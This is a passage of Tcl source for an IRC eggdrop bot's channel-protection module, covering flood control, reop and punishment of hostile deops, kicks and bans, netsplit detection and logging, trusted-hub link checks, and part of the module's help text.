		if {$h != "*"} { append q " ($h)" } ; al prot $q ; prot_max 0 $c
		set prot_mo [string range [bi [getchanmode $c] 0] 1 end]
		sop:mode $c -o $n ; sop:mode $c +m ; sop:mode $c +i "" do ; incr prot_f($uh@$c)
	    }
	}
	default {
	    # msg - pub - nick - ctcp - join
	    if {$c == "*"} {
		set i [wmh $uh ban]
		if {![isignore $i]} {
		    newignore $i Protector "Flooding me via [stru $t]" $prot_bantime
		    al prot "Ignoring $i for $prot_bantime minutes : flooding me via [stru $t]"
		}
	    } else {
		if {$prot_f($uh@$c) < 2} { set k "You are flooding, please stop it!" } else {
		    set k "Ok, continue flooding out of $c!"
		} ; set b "$t flood $c from $n!$uh"
	    }
	}
    }
    if {[info exists k]} {
	if {[validchan $c] && [botonchan $c] && [botisop $c]} { putkick $c $n "[boja] - $k" }
    }
    set x 0
    foreach f [array names prot_f] { set w [bi [split $f @] 1] ; if {$w == $c} { incr x } }
    if {$x > 1} {
	if {![info exists prot_fnet] || [lsearch -exact $prot_fnet $c] == -1} {
	    al prot "[warn] Detected floodnet on channel [c n]$c[c] (last flood from $n!$uh) - locking channel"
	    if {![info exists prot_fnet]} { set prot_fnet $c } else { lappend prot_fnet $c }
	}
	sop:mode $c +m ; sop:mode $c +i "" do
	foreach j [timers] { if {[string match "*prot_unlock $c*" $j]} { killtimer [lindex $j 2] } }
	timer 5 "prot_unlock $c"
    }
    set i [lsearch -exact "pub ctcp join kick deop nick msg" $t]
    if {$i == -1} {
	set i 20
    } else {
	if {$c == "*"} { set C [lindex [channels] 0] } else { set C $c }
	set i [lindex [split [lindex [channel info $C] [expr $i +9]] :] 1]
    }
    if {$i < 20} { set i 20 }
    if {$prot_f($uh@$c) > 1 && $c != "*" && ![ischanban [wmh $uh ban] $c]} {
	newchanban $c [wmh $uh ban] Protector $b [expr $prot_bantime + [rand 10]] sticky
    }
    utimer $i "prot_unfl $uh@$c" ; return 1
}
proc prot_response {n uh h c v vh w bm} {
    global prot_timeout nick_kicked
    if {$w == "Deoped"} { set on "on" } else { set on "from" }
    if {[isbotnick $v]} {
	if {$h != "*"} { set q "$h ($n!$uh)" } else { set q "$n!$uh" }
	al prot "[warn] $q [strl $w] me $on [c n]$c[c]!!!"
	switch -exact $w {
	    "Deoped" { sop:need $c op }
	    "Kicked" {
		sop:need $c limit; sop:need $c invite; sop:need $c key
		utimer 2 "sop:need $c op" ; utimer [expr 3 + [rand 5]] "sop:need $c op"
	    }
	    "Banned" { sop:need $c unban }
	}
	return 0
    }
    if {[matchattr $vh b]} { set b "Bot" } else { set b "" }
    if {$h != "*"} { set q "$h ($n!$uh)" } else { set q "$n!$uh" }
    al prot "[warn] $b $vh ($v) [strl $w] by $q $on [c n]$c[c]!!!"
    if {![botisop $c]} { al prot "I 'm not oped on $c, I can do nothing.. :o(" ; return 0 }
    switch -exact $w {
	"Deoped" { if {[wasop $v $c]} { sop:mode $c +o $v } }
	"Kicked" {
	    if {![matchattr $vh b]} {
		putquick "INVITE $v $c"
		if {[string match *k* [lindex [getchanmode $c] 0]]} {
		    putquick "NOTICE $v :[boja] - key for $c = [b][lindex [getchanmode $c] 1][b]"
		}
		if {[wasop $v $c]} {
		    if {[info exists nick_kicked($c)]} {
			lappend nick_kicked($c) [strl $v]
		    } else { set nick_kicked($c) [strl $v] }
		    utimer $prot_timeout "prot_remove $c [p_test [strl $v]]"
		}
	    }
	}
	"Banned" { sop:mode $c -b $bm do }
    }
    prot_punish $n $uh $c $v $vh $w $on
}
proc prot_check {n h c v vh} {
    global prot_level
    if {(![info exists prot_level($c)] && $prot_level(all) == "off") || ([info exists prot_level($c)] && $prot_level($c) == "off")} { return 0 }
    if {[isbotnick $n] || [flagged $h b] || ($n == $v)} { return 0 }
    if {[isbotnick $v] || [flagged $vh b]} { if {[flagged $h m n $c]} { return 0 } else { return 1 } }
    if {([flagged $vh n] && ![flagged $h n]) || ([flagged $vh n $c] && ![flagged $h m n $c])} { return 1 }
    if {([flagged $vh m] && ![flagged $h m]) || ([flagged $vh m $c] && ![flagged $h m $c])} { return 1 }
    if {[flagged $vh t] && ![flagged $h t n $c]} { return 1 }
    if {([flagged $vh o] && ![flagged $h o]) || ([flagged $vh o $c] && ![flagged $h o $c])} { return 1 }
    return 0
}
proc prot_deoped {n uh h c mc v} {
    set c [strl $c] ; set vh [nick2hand $v $c]
    if {[prot_check $n $h $c $v $vh]} { prot_response $n $uh $h $c $v $vh Deoped 0 }
}
proc prot_mdeop {f k t} {
    if {![string match "-ooo*" [bi $t 1]]} { return 0 }
    set n [string range $f 0 [expr [string first ! $f] - 1]]
    set uh [string range $f [expr [string first ! $f] + 1] end]
    set c [strl [bi $t 0]] ; set h [nick2hand $n $c] ; set o 0
    for {set i 2} {$i < 5} {incr i} {
	set V [nick2hand [bi $t $i] $c]; if {[flagged $V f f $c] || [flagged $V o o $c]} { set o 1; break }
    }
    if {!$o || ([matchattr $h b] && [flagged $h o o $c])} { return 0 }
    if {[flagged $h f f $c] || [flagged $h o o $c]} { prot_flood $n $uh $h deop $c } ; return 0
}
proc prot_remove {c n} {
    global nick_kicked
    if {(![info exists nick_kicked($c)]) || ($nick_kicked($c) == "")} { return 0 } ; set r ""
    foreach x $nick_kicked($c) {
	if {[strl $x] != [strl $n]} { lappend r [strl $x] }
    }
    set nick_kicked($c) $r
}
proc prot_kicked {n uh h c t r} {
    set c [strl $c] ; set th [nick2hand $t $c]
    if {[prot_check $n $h $c $t $th]} { prot_response $n $uh $h $c $t $th Kicked 0 }
}
proc prot_reop {n uh h c} {
    global nick_kicked ; set n [strl $n] ; set c [strl $c]
    if {![info exists nick_kicked($c)] || ![string match *$n* $nick_kicked($c)]} { return 0 } ; set r ""
    foreach x $nick_kicked($c) {
	if {[strl $x] == [strl $n]} {
	    sop:mode $c +o $n
	} else { lappend r [strl $x] }
    }
    set nick_kicked($c) $r
}
proc prot_unlock {c} {
    global max-bans prot_fnet prot_banlist ; set c [strl $c]
    if {![validchan $c] || ![botonchan $c] || ![botisop $c]} { return 0 }
    if {[info exists prot_fnet]} {
	set i [lsearch -exact $prot_fnet $c]
	if {$i != -1} {
	    set prot_fnet [lreplace $prot_fnet $i $i]
	    if {$prot_fnet == ""} { unset prot_fnet }
	    if {![string match *m* [lindex [channel info $c] 0]]} { sop:mode $c -m }
	}
    }
    if {[info exists prot_banlist($c)]} { set C $c } else { set C "all" }
    if {$prot_banlist($C) == "on"} {
	if {[expr [llength [chanbans $c]]] >= ${max-bans}} {
	    if {![string match *i* [bi [getchanmode $c] 0]]} {
		sop:mode $c +i
		foreach t [timers] { if {[string match "*prot_unlock $c*" $t]} { killtimer [lindex $t 2] }}
		timer 5 "prot_unlock $c"
	    }
	    al prot "[c n]Keeping locked[c] channel [c n]$c[c] for 5 minutes due to full ban list: [c n][b]please check it[b][c] !!!"
	    foreach u [chanlist $c] {
		if {[matchattr [nick2hand $u $c] o|o $c]} {
		    putserv "NOTICE $u :[boja] - Please [b]clear [c n]$c[c] ban list[b] !!!"
		}
	    }
	} else { if {![string match *i* [lindex [channel info $c] 0]]} { sop:mode $c -i } }
    }
    al prot "[c o]Unlocked[c] channel [c n]$c[c]"
}
proc prot_ban_fix {bb fb c} { if {[ischanban $bb $c]} { putquick "MODE $c -b+b $bb $fb" } }
proc prot_banned {n uh h c mc bm} {
    global bnick max-bans prot_banlist ; set c [strl $c]
    if {[info exists prot_banlist($c)]} { set C $c } else { set C "all" }
    if {$prot_banlist($C) == "on"} {
	if {[expr [llength [chanbans $c]]] >= [expr ${max-bans}]} {
	    if {[botisop $c]} { putquick "MODE $c +i" ; timer 5 "prot_unlock $c" }
	    al prot "[c n]Locked[c] channel [c n]$c[c] for 5 minutes due to full ban list: [b]please check it[b] !!!"
	    foreach u [chanlist $c] {
		set uhand [nick2hand $u $c]
		if {[matchattr $uhand o|o $c] && ($uhand != $bnick) && (![matchattr $uhand b])} {
		    putnotc $u "[boja] - Please [b]clear $c ban list[b] !!!"
		}
	    }
	}
    }
    if {[isbotnick $n] || [matchattr $h b]} { return 0 }
    set vh "" ; set victim_n [string range $bm 0 [expr [string first "!" $bm] - 1]]
    if {$victim_n != "*"} {
	set victim $victim_n
	foreach u [chanlist $c] {
	    if {[string match $victim_n $u]} {
		if {[string match *[string range $bm [expr [string first "!" $bm] + 1] end]* [getchanhost $u $c]]} {
		    set vh [nick2hand $u $c] ; if {$vh != "*"} { set victim $u ; break }
		}
	    }
	}
    } else {
	set victim_id [lindex [split $bm "@"] 0]
	set victim_id [string range $victim_id [string first "!" $bm] end]
	regsub -all {!} $victim_id "" victim_id ; regsub {~} $victim_id "" victim_id
	regsub -all {\*} $victim_id "" victim_id ; set victim_h [lindex [split $bm "@"] 1]
	regsub -all {\*} $victim_h "" victim_h ; set victim "*$victim_id*$victim_h*"
	regsub -all {\*\*} $victim {*} victim ; regsub -all {\*\*} $victim {*} victim ; set vh ""
	foreach u [userlist] { if {[validuser $u] && [string match $victim [getuser $u HOSTS]]} { set vh $u } }
	if {$vh != "*"} { set victim [hand2nick $vh $c] } else { set victim $vh }
    }
    if {[prot_check $n $h $c $victim $vh]} {
	prot_response $n $uh $h $c $victim $vh Banned $bm
    } else {
	regsub {!} $bm {!*} smartban ; regsub {~} $smartban "" smartban
	regsub -all {\*\*} $smartban {*} smartban ; regsub -all {\*\*} $smartban {*} smartban
	if {![string match $bm $smartban] && [regexp -nocase {[a-z]} $smartban] && [botisop $c]} {
	    utimer [rand [expr [llength [bots]] + 1]] "prot_ban_fix [p_test $bm] [p_test $smartban] $c"
	}
    }
}
proc protlim_check {{ch ""}} {
    global prot_limit ; if {$ch == ""} { set ch [channels] } ; set ch [strl $ch]
    foreach c $ch {
	if {![validchan $c]} { if {[info exists prot_limit($c)]} { unset prot_limit($c) } ; continue }
	if {(![info exists prot_limit($c)] && $prot_limit(all) == "off") || ([info exists prot_limit($c)] && $prot_limit($c) == "off")} {
	    foreach t [timers] { if {[lindex $t 1] == "protlim_check $c"} { killtimer [lindex $t 2] } }
	    continue
	}
	set b 0 ; foreach t [timers] { if {[lindex $t 1] == "protlim_check $c"} { set b 1 } }
	if {$b} { continue }
	if {[info exists prot_limit($c)]} { set k $c } else { set k "all" } ; set g [getchanmode $c]
	set n [llength [chanlist $c]] ; set j [expr [bi $prot_limit($k) 0]] ; incr n $j
	if {![string match "*l *" $g]} { set a "" } else { set a [string range $g [expr [string last " " $g] + 1] end] }
	if {$a != $n && [botonchan $c] && [botisop $c]} { sop:mode $c +l $n }
	timer [expr [bi $prot_limit($k) 1]] "protlim_check $c"
    }
}
proc protlim_remove {p} {
    global prot_limit ; set c [bi $p 0] ; set j [bi $p 1] ; if {$c == "all"} { set c [channels] }
    foreach C [strl $c] {
	if {(![info exists prot_limit($C)] && $prot_limit(all) == "off") || ([info exists prot_limit($C)] && $prot_limit($C) == "off")} { sop:mode $C -l }
    }
}
proc protlim_ebcheck {n uh h c mc v} {
    global prot_leb prot_lebex ; set c [strl $c] ; set S 0
    if {[info exists prot_leb($c)]} { set C $c } else { set C "all" }
    if {$prot_leb($C) == "off" || [matchattr $h b]} { return 0 }
    if {(([string length $prot_lebex] < 2 || $prot_lebex == "permowner") && [flagged $h $prot_lebex]) || ([string length $prot_lebex] > 1 && [eval "flagged $h [split $prot_lebex |] $c"])} {
	set S 1 ; set SQ "flagged[c o] $prot_lebex[c]"
    }
    if {$S} { al prot "[c o]Skipping[c] Limit Extra Bitch alert for[c o] $h[c] on $c: $SQ" ; return 0 }
    if {![botisop $c]} {
	al prot "[warn] Limit Extra Bitch can not punish[c e] $n[c] on[c e] $c[c]: not oped.." ; return 0
    }
    set x "[boja] - Limit Extra Bitch: manual limit setting not allowed"
    al prot "Limit Extra Bitch: detected manual[c n] limit change[c] on[c n] $c[c]: reacting.."
    switch -exact -- $prot_leb($C) {
	"notice" - "deop" {
	    if {$prot_leb($C) == "deop"} { sop:mode $c -o $n do } ; putquick "PRIVMSG $n :$x"
	}
	default {
	    if {[lsearch -exact "kick ban" $prot_leb($C)] == -1} {
		al prot "[c e]Unknown[c] Limit Extra Bitch mode:[c e] $prot_leb($C)[c]: kicking.."
	    }
	    if {$prot_leb($C) == "ban"} {
		newchanban $c [wmh $uh ban] "LimEBitch" "$n changed limit on $c" 1 sticky
	    }
	    if {[onchan $n $c]} { putkick $c $n $x }
	}
    }
    protlim_check $c
}
proc proteb_check {n uh h c mc v} {
    global prot_eb prot_ebmsg prot_ebex sop_red ; set c [strl $c] ; set vh [nick2hand $v $c]
    if {[info exists prot_eb($c)]} { set C $c } else { set C "all" }
    if {![onchan $n $c] || ![botisop $c] || $prot_eb($C) == "off" || [matchattr $h b] || [matchattr $vh n] || [matchattr $vh b]} { return 0 }
    set f [split $prot_ebex |]
    if {[llength $f] < 2} { if {[flagged $h $f]} { return 0 } } else { if {[flagged $h $f $c]} { return 0 }}
    sop:mode $c -o $v ; set o [smartbot $sop_red $c] ; set m $prot_eb($C)
    if {$h != "*"} { set N "$n ( $h )" } else { set N $n }
    if {$vh != "*"} { set V "$v ( $vh )" } else { set V $v } ; set q "Extra Bitch System deoped $V + "
    switch -exact $m {
	"notice" { puthelp "NOTICE $n :[boja] - $prot_ebmsg" ; append q "noticed" }
	"deop" {
	    foreach b $o { putbot $b "sop:req deop $c $n do" } ; append q "deoped & noticed"
	    utimer 1 "puthelp \"NOTICE $n :\[boja\] - [p_test $prot_ebmsg]\""
	}
	"kick" {
	    foreach b $o { putbot $b "sop:req kick $c $n \"\" $prot_ebmsg" } ; append q "kicked"
	}
	"ban" {
	    foreach b $o { putbot $b "sop:req kick $c $n \"\" $prot_ebmsg" }
	    append q "kick-banned for 1 minute"
	    newchanban $c [wmh $uh ban] "ExtraBitch" "$N oped $V on $c" 1 sticky
	}
    }
    append q " $N: oped $V on $c.." ; al prot $q
}
proc prot_restore {w} {
    global prot_level prot_lev_orig prot_eb prot_eb_orig prot_notice prot_mo split_serv
    global nick_module_loaded nick_cycle nick_cycle_ori nick_time nick_time_ori
    if {[lsearch -exact "end disc" $w] == -1} {
	if {[array names split_serv] != ""} {
	    foreach t [timers] {
		if {[string match *prot_restore* [lindex $t 1]]} { killtimer [lindex $t 2] }
	    }
	    timer [expr 2 + [rand 2]] "prot_restore $w" ; return 0
	}
    }
    foreach i [array names prot_level] {
	if {[info exists prot_lev_orig($i)]} {
	    set prot_level($i) $prot_lev_orig($i) ; unset prot_lev_orig($i)
	}
    }
    foreach i [array names prot_lev_orig] { unset prot_lev_orig($i) }
    foreach i [array names prot_level] {
	if {$i != "all" && $prot_level($i) == $prot_level(all)} { unset prot_level($i) }
    }
    foreach i [array names prot_eb] {
	if {[info exists prot_eb_orig($i)]} { set prot_eb($i) $prot_eb_orig($i) }
    }
    foreach i [array names prot_eb_orig] { unset prot_eb_orig($i) }
    foreach i [array names prot_eb] {
	if {$i != "all" && $prot_eb($i) == $prot_eb(all)} { unset prot_eb($i) }
    }
    prot_start
    switch -exact $w {
	end { set k "Net-Split alarm ended.." }
	disc { set k "I got disconnected from server.." }
	default {
	    set M ""
	    foreach m [split [string range [bi [getchanmode $w] 0] 1 end] ""] {
		if {![string match *$m* $prot_mo]} { append M $m }
		if {$M != ""} { putquick "MODE $w -$M" }
	    }
	    set k "[c o]TakeOver[c] alarm on $w [c o]ended[c].."
	}
    }
    al prot "[c o]Restored[c] original User-Protector / Extra-Bitch System configuration and chanmodes: $k"
    if {$w == "end"} { set C [strl [channels]] ; set q "Net-Split" } else {
	set C $w ; set q "TakeOver"
    }
    foreach c $C {
	if {([info exists prot_notice($c)] && $prot_notice($c) == "on") || (![info exists prot_notice($c)] && $prot_notice(all) == "on")} {
	    puthelp "NOTICE $c :[boja] \[security\] - Out of $q danger: have a nice day :)"
	}
    }
    foreach t [timers] { if {[string match *prot_restore* [lindex $t 1]]} { killtimer [lindex $t 2] } }
    if {[info exists nick_cycle_ori]} { set nick_cycle $nick_cycle_ori ; unset nick_cycle_ori }
    if {[info exists nick_time_ori]} { set nick_time $nick_time_ori ; unset nick_time_ori }
    if {$nick_module_loaded == 1} { nick:check }
}
proc prot_max {w {ch ""}} {
    global prot_level prot_lev_orig prot_eb prot_eb_orig prot_split prot_notice prot_collide
    global nick_module_loaded nick_cycle nick_cycle_ori nick_time nick_time_ori ; set m prot
    set ch [strl $ch] ; if {$ch == "" && $prot_split == "off"} { return 0 }
    if {$ch != ""} { set ql "'[c n]high[c]' on [c n]$ch[c]" ; set qe "'[c n]kick[c]' on [c n]$ch[c]"
    } else { set ql "'[c n]nightmare[c]'" ; set qe "[c n]deop[c] on channels with level >= 'medium'" }
    al $m "[module_name $m]: level $ql - Extra Bitch: $qe (for $prot_split minutes)"
    if {$ch == ""} { set C [strl [channels]] ; set q "Net-Split" } else {
	set C $ch ; set q "TakeOver"
    }
    foreach c $C {
	if {([info exists prot_notice($c)] && $prot_notice($c) == "on") || (![info exists prot_notice($c)] && $prot_notice(all) == "on")} {
	    puthelp "NOTICE $c :[boja] \[security\] - [b]$q danger[b]: don't op/deop manually (Extra Bitch enabled) and don't joke with op please!"
	}
    }
    if {$prot_collide != "off" && $w} {
	if {$nick_module_loaded == 0} {
	    al prot "[c e]Nick-Collide Protection [b]UNAVAILABLE!!![b][c]To enable this feature, load module 'nick' on all botnet ([c l].msetup A nick load[c])"
	} else {
	    if {![info exists nick_cycle_ori]} { set nick_cycle_ori $nick_cycle }
	    if {![info exists nick_time_ori]} { set nick_time_ori $nick_time }
	    if {$nick_cycle == "off"} { set nick_cycle "smart" }
	    set nick_time $prot_collide ; set o 1
	    foreach t [utimers] { if {[string match *nick:check* [lindex $t 1]]} { set o 0 } }
	    if {$o} { nick:check }
	    al prot "Anti Nick-Collide Protection: [c n]enabled[c] ([c n]$nick_cycle[c] mode, for $prot_split minutes)"
	}
    }
    if {$ch != ""} {
	if {![info exists prot_lev_orig($ch)]} {
	    if {[info exists prot_lev_orig($ch)]} {
		set prot_lev_orig($ch) $prot_level($ch)
	    } else {
		set prot_lev_orig($ch) $prot_level(all)
	    }
	}
	set prot_level($ch) "high"
	if {![info exists prot_eb_orig($ch)]} {
	    if {[info exists prot_eb($ch)]} {
		set prot_eb_orig($ch) $prot_eb($ch)
	    } else {
		set prot_eb_orig($ch) $prot_eb(all)
	    }
	}
	set prot_eb($ch) "kick"
    } else {
	foreach i [array names prot_level] {
	    if {![info exists prot_lev_orig($i)]} { set prot_lev_orig($i) $prot_level($i) }
	    if {[lsearch -exact "off low" $prot_level($i)] == -1} { set prot_level($i) "nightmare" }
	    if {$prot_level($i) == "nightmare"} {
		if {![info exists prot_eb_orig($i)]} {
		    if {[info exists prot_eb($i)]} {
			set prot_eb_orig($i) $prot_eb($i)
		    } else {
			set prot_eb_orig($i) $prot_eb(all)
		    }
		}
		set prot_eb($i) "deop"
	    }
	}
    }
    foreach t [timers] { if {[string match *prot_restore* [lindex $t 1]]} { killtimer [lindex $t 2] } }
    prot_start
    if {$ch != ""} { timer [expr 8 + [rand 3]] "prot_restore $ch" } else {
	timer $prot_split "prot_restore end"
    }
}
proc add_split {s1 s2} {
    global split_serv
    if {[info exists split_serv($s1@$s2)] || [info exists split_serv($s2@$s1)]} { return 0 }
    al prot "[warn] Possible [c n]Net-Split[c] detected: [c n][b]$s1[b][c] <---> [c n][b]$s2[b][c]"
    set split_serv($s1@$s2) [unixtime] ; prot_max 0
    timer 180 "rem_split $s1 $s2 timeout" ; split_log $s1 $s2 "begin"
}
proc rem_split {s1 s2 {w ""}} {
    global split_serv
    foreach ss [array names split_serv] {
	if {[string match $ss $s1@$s2] || [string match $ss $s2@$s1]} {
	    set t [expr [expr [unixtime] - $split_serv($ss)] / 60]
	    if {$t == 0} { set t [expr [unixtime] - $split_serv($ss)] ; set q "seconds" } else {
		set q "minutes"
	    }
	    set t "(splitted for $t $q)" ; unset split_serv($ss)
	}
    }
    if {$w == "timeout"} {
	al prot "[c n]Net-Split[c] timed out: [c n]$s1[c] <---> [c n]$s2[c] (splitted for more than 3 hours..)"
	split_log $s1 $s2 "end"
    } elseif {$w == "disc"} {
	al prot "Resetting [c n]Net-Split[c] information: [c n]$s1[c] <---> [c n]$s2[c] - I got disconnected from server.."
	split_log $s1 $s2 "end"
    } else {
	if {[info exists t]} {
	    al prot "[warn] Reconnect from [c n]Net-Split[c] detected: [c n][b]$s1[b][c] <---> [c n][b]$s2[b][c] $t"
	    split_log $s1 $s2 "end" ; prot_max 1
	}
    }
    foreach ti [timers] {
	if {[lindex $ti 1] == "rem_split $s1 $s2 timeout" || [lindex $ti 1] == "rem_split $s2 $s1 timeout"} {
	    killtimer [lindex $ti 2]
	}
    }
}
proc split_disc {t} {
    global split_quit split_serv prot_eb_orig
    foreach i [array names split_serv] { regsub "@" $i " " s; rem_split [lindex $s 0] [lindex $s 1] "disc"}
    foreach i [array names split_quit] { unset split_quit($i) }
    if {[array names prot_eb_orig] != ""} { prot_restore "disc" }
}
proc split_log {s1 s2 w} {
    global splits_module_conf
    if {[file exists $splits_module_conf]} { set m a } else { set m w };set f [open $splits_module_conf $m]
    puts $f "[unif_len $s1 20] <---> [unif_len $s2 20 r] - [unif_len [ctime [unixtime]] 10 r] - $w"
    close $f ; set i 0 ; set f [open $splits_module_conf r]
    while {![eof $f]} { set s [gets $f] ; if {[eof $f]} { break } ; incr i } ; close $f
    if {$i > 35} {
	set i 1 ; file copy -force $splits_module_conf ${splits_module_conf}.old
	file delete -force $splits_module_conf
	set sd [open ${splits_module_conf}.old r] ; set dd [open $splits_module_conf w]
	while {![eof $sd]} {
	    set s [gets $sd] ; if {[eof $sd]} { break } ; if {$i > 6} { puts $dd $s } ; incr i
	}
	close $sd ; close $dd ; file delete -force ${splits_module_conf}.old
    }
}
proc quit_check {} {
    global split_quit
    foreach i [array names split_quit] { if {[bi $split_quit($i) 2] != "yes"} { unset split_quit($i) } }
}
proc raw:quit {f k a} {
    if {[bi $a 2] != "" || [string index [bi $a 0] 0] != ":"} { return 0 }
    global split_quit ; set uh [strip_id [string range $f [expr [string first "!" $f] + 1] end]]
    regsub ":" $a "" a ; if {[bi $a 0] == [bi $a 1]} { return 0 }
    set split_quit($uh) $a ; utimer 5 quit_check
}
proc prob:netsplit {n uh h c} {
    global split_quit prot_ps ; set uh [strip_id $uh]
    if {[info exists split_quit($uh)]} {
	add_split [lindex $split_quit($uh) 0] [lindex $split_quit($uh) 1] ; lappend split_quit($uh) "yes"
    }
}
proc prob:rejoin {n uh h c} {
    global split_quit ; set uh [strip_id $uh]
    if {[info exists split_quit($uh)]} {
	rem_split [lindex $split_quit($uh) 0] [lindex $split_quit($uh) 1] ; unset split_quit($uh)
    }
}
### Da qui: migliorare il dcc:clear?
proc dcc:splits {h i a} {
    global pa split_serv splits_module_conf ; set m "prot" ; set pa($i) $m
    if {$a == ""} {
	putcmdlog "\#$h\# splits" ; pa $i "The following servers are under [c n]Net-Split[c]:" ; set o 0
	foreach ss [array names split_serv] {
	    set t [expr [expr [unixtime] - $split_serv($ss)] / 60]
	    if {$t == 0} { set t "[expr [unixtime] - $split_serv($ss)] seconds"} else { set t "$t minutes"}
	    regsub "@" $ss " " k ; set o 1
	    pa $i "[c n][b][unif_len [lindex $k 0] 20][b][c] <---> [c n][b][unif_len [lindex $k 1] 20 r][b][c] (started $t ago)"
	}
	if {!$o} {
	    pa $i "<[c n][b]none[b][c]> :)"
	    pa $i "Try '[c m].splits log[c]' to see logged [c n]Net-Splits[c].."
	}
    } elseif {[strl $a] == "log"} {
	putcmdlog "\#$h\# splits log"
	if {![file exists $splits_module_conf]} { pa $i "No Net-Splits logged.. :)" ; return 0 }
	pa $i "Logged [c n]Net-Splits[c]:" ; set f [open $splits_module_conf r]
	while {![eof $f]} { set s [gets $f] ; if {[eof $f]} { break } ; pa $i "$s" } ; close $f
    } elseif {[strl $a] == "clear"} {
	if {[matchattr $h n]} { dcc:clear $h $i "splits" } else {
	    pa $i "Sorry, only global owners can remove Net-Splits logfile.."
	}
    } else { dcc:splits $h $i "" }
}
proc prot_auth_expire {h} {
    global prot_auth
    if {[info exists prot_auth($h)]} {
	unset prot_auth($h) ; al prot "Expired Anti-Fake Authentication for $h.."
    }
}
proc prot_bh_check {b v} {
    global prot_bh bnick
    if {[lsearch -exact [strl [split $prot_bh ,]] [strl $v]] == -1} {
	if {[strl $v] != [strl $bnick]} {
	    unlink $b "[boja] - We don 't like fakes!"
	    al security "[warn] Possibly [c n]fake-bot $b[c] tried to link to [c n]$v[c]"
	    al prot "Unlinked [b]$b[b] - $v is not a trusted hub (see '.prot bitchub')"
	}
    }
}
proc prot_ctest {} {
    global prot_level prot_lev_orig
    foreach t [timers] { if {[lindex $t 1] == "prot_ctest"} { killtimer [lindex $t 2] } }
    foreach c [array names prot_level] {
	if {$c != "all" && ![validchan $c]} { unset prot_level($c) ; module_save prot }
    }
    foreach c [array names prot_lev_orig] {
	if {$c != "all" && ![validchan $c]} { unset prot_lev_orig($c) }
    }
    timer [expr 20 + [rand 20]] prot_ctest
}
prot_ctest ; prot_start
proc dcc:limit {h i a} { global lastbind ; set lastbind "prot" ; dcc:module_interface $h $i "limit $a" }
proc dcc:eb {h i a} { global lastbind ; set lastbind "prot" ; dcc:module_interface $h $i "eb $a" }
proc bot:prot_doauth {b c a} {
    global prot_auth prot_authtime ; set h [bi $a 0] ; set o [bi $a 1] ; set prot_auth($h) $o
    if {$o} {
	al prot "Anti-Fake check for [b]$h[b] will be skipped for $prot_authtime minutes (Authentication [c o]granted[c] by bot $b)"
	foreach t [timers] {
	    if {[bi [lindex $t 1] 0] == "prot_auth_expire" && [bi [lindex $t 1] 1] == $h} {
		killtimer [lindex $t 2]
	    }
	}
	timer $prot_authtime "prot_auth_expire $h"
    } else {
	al prot "[c e]Denied[c] Anti-Fake check skip for [b]$h[b] (Authentication failure on bot $b)"
    }
}
bind dcc $prot_module_bind limit dcc:limit
bind dcc $prot_module_bind eb dcc:eb
bind dcc t|m splits dcc:splits
bind raw - QUIT raw:quit
bind splt - * prob:netsplit
bind join - * prob:rejoin
bind rejn - * prob:rejoin
bind evnt - disconnect-server split_disc
bind bot b prot_doauth bot:prot_doauth

proc ${m}_module_setup {h i m l G g w p} {
    global pa bnick ${m}_auth ; set a [module_array_vars $m] ; eval [module_globals $m] ; set pa($i) $m
    #al "testing ${m}_module_setup" "h=$h, i=$i, m=$m, G=$G, g=$g, w=$w, p=$p, array_vars=$a"
    switch -exact $w {
	"auth" {
	    if {$p == ""} {
		if {[info exists prot_auth($h)]} {
		    if {$prot_auth($h)} {
			set q "You are [c o]authenticated[c]"
			foreach t [timers] {
			    if {[bi [lindex $t 1] 0] == "prot_auth_expire" && [bi [lindex $t 1] 1] == $h} {
				append q ". Time left: [lindex $t 0] minutes"
			    }
			}
		    } else { set q "You [c e]failed[c] authentication" }
		} else {
		    set q "You are [c e]not authenticated[c]"
		}
		pa $i $q ; pa $i "Use: '[c m].$m $w your-password[c]' to authenticate yourself." ; return 0
	    }
	    if {![passwdok $h [bi $p 0]]} {
		al security "[warn] $h failed '[b].$m $w[b]' Authentication!"
		set prot_auth($h) 0 ; putallbots "prot_doauth $h 0"
		boot $h "Anti-Fake Protection: Authentication failure" ; return 0
	    }
	    set prot_auth($h) 1 ; putallbots "prot_doauth $h 1"
	    al $m "Anti-Fake check for [b]$h[b] will be skipped for $prot_authtime minutes (Authenticated)"
	    foreach t [timers] {
		if {[bi [lindex $t 1] 0] == "prot_auth_expire" && [bi [lindex $t 1] 1] == $h} {
		    killtimer [lindex $t 2]
		}
	    }
	    timer $prot_authtime "prot_auth_expire $h"
	}
	default {
	    module_save_changes $h $i $m $l $G $g $w $p $a ; prot_start
	    if {$w == "limit" && ($l == 0 || [lsearch -exact $G [strl $bnick]] != -1)} {
		protlim_remove $p
	    }
	}
    }
}

al init "[module_name $m] (version [expr $${m}_ver]) loaded and ready!"; set ${m}_module_loaded 1; unset m
}
set smart_prot_help {%{help=prot}%{+m|+m}
###  %b.prot%b
   Standard Interface to Smart Protector Module.
   Displays module status and saved settings.
See also: .mprot
###  %b.prot -v%b
   Displays module status, complete command list and quick-help.
###  %b.prot ver%b
   Displays Smart Protector Module version.
###  %b.prot author%b
   Displays informations about Module Author.
###  %b.prot clear%b
   Removes Smart Protector configuration file.
See also: '.help clear'
###  %b.prot bh%b [ - / Hub_1,Hub_2,...Hub_N]
   Disables ('-') or enables ('Hub1,Hub2,..') Bitch Hub Mode: when
   active this protection will allow bots to link only to specified
   hubs. This works as a good workaround against an eggdrop bug which
   lets bot-fakes own your botnet. Default is off ('-').
Note1: Make sure to set up properly your hub-list with this command, or
       your botnet will have serious troubles!
Note2: You must include in hub-list ALL your botnet hubs AND alternate
       hubs to prevent your botnet to remain unlinked in case of
       primary hub down.
Note3: It is higly suggested to check that all of your bots have a
       password set not only with primary hubs, but also with alternate
       hubs. To improve protection, you can give the '+l' botflag to
       all of your leaf-bots also (see '.help whois').
See also: .help whois, .botattr, .mbotattr
###  %b.prot level%b <#channel or all> [all / off / low / medium / high / nightmare]
   Sets user protection level for given channel or for all:
   'all' means that settings for each channel will be the same as for 
   'all' (default); 'off' disables channel protection, including any
   advanced flood control different from eggdrop standard (dangerous!);
   'low' means that deoped user will be reoped by bot (or invited
   and informed about channel key in case of kick) without punishing the
   deoper (or kicker); 'medium' means that after restoring user status,
   the deoper (or kicker) will be punished with a deop and notice; in
   'high' protection level the deoper (or kicker) will be punished with
   a kick; 'nightmare' mode is for paranoid people, so deoper (or kicker)
   will be kickbanned from channel. Ban duration has a default lifetime
   of 5 minutes, but this can be changed with '.prot bantime <minutes\#>'.
   Nightmare level is automatically enabled when a netsplit is detected,
   in conjunction with Extra Bitch, to grant the maximum security level
